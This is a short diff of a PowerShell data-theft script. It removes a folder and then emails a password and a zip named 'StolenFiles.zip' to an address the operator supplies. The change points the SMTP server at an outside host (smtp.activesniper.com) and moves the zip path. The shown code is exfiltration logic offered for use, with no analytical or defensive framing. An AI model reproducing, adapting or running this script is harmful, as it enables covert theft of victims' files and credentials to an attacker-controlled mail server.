@@ -66,7 +66,7 @@ $del = Remove-Item $Destination -Force -Recurse
 $email = "(enter email address you want files sent to)"
 
 #Send password for files to your e-mail
-$SMTPServer = "smtp.example.net"
+$SMTPServer = "smtp.activesniper.com"
 $Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
 $From = $email
 $To = $email
@@ -79,7 +79,7 @@ $Msg.Dispose()
 $Mailer.Dispose()
 
 #Send zip folder to your e-mail
-$ZipFolder = "C:\Users\(username)\Desktop\StolenFiles.zip"
+$ZipFolder = "C:\StolenFiles.zip"
 $SMTPServer = "smtp.example.net"
 $Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
 $From = $email
